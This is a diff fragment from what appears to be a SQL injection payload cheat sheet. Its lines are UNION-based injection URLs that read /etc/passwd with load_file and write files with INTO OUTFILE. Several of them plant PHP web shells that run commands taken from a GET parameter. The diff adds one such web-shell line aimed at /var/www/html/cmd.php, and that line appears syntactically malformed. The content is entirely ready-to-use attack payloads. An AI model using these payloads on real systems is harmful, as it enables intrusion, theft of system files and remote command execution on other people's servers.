@@ -21,5 +21,6 @@ http://vulnsite.com/index.php?id=-1+union+all+select+1,group_concat(user,0x3a,fi
 http://10.10.10.10/vul.php?id=1 union all select load_file('/etc/passwd')
 
 # Write content into a file
-http://10.10.10.10/vul.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,4,"content",6 into OUTFILE 'outfile'
+http://10.10.10.10/vul.php?id=1 and 1=2 union select all 1,2,3,4"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE '/var/www/html/cmd.php'
 http://10.10.10.10/vul.php?id=1 union all select 1,2,3,"system($_GET[\'c\']); ?>",5 into OUTFILE '/var/www/shell.php'
